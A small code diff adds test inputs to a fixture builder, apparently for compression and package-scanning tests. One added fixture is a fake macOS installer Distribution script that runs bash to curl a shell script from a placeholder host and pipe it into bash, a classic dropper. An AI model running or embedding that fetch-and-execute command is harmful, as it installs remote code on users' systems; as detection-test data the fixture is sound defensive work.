@@ -56,6 +56,11 @@ def build():
     add("run_4_then_other", b"AAAAB" + b"CCCCC" + b"AAAA")
     add("run_255_plus_4", b"Z" * (255 + 4))
 
+    # An installer Distribution as the xar/package rule tests use it.
+    add("distribution_dropper",
+        b'<a><script>system.run("/bin/bash", "-c", "curl -fsSL '
+        b'https://example-cdn.invalid/a.sh | /bin/bash");</script></a>')
+
     add("zeros_64k", b"\x00" * 65536)
 
     # ~250 KB of low-entropy bytes at level 1 -> 3 blocks.
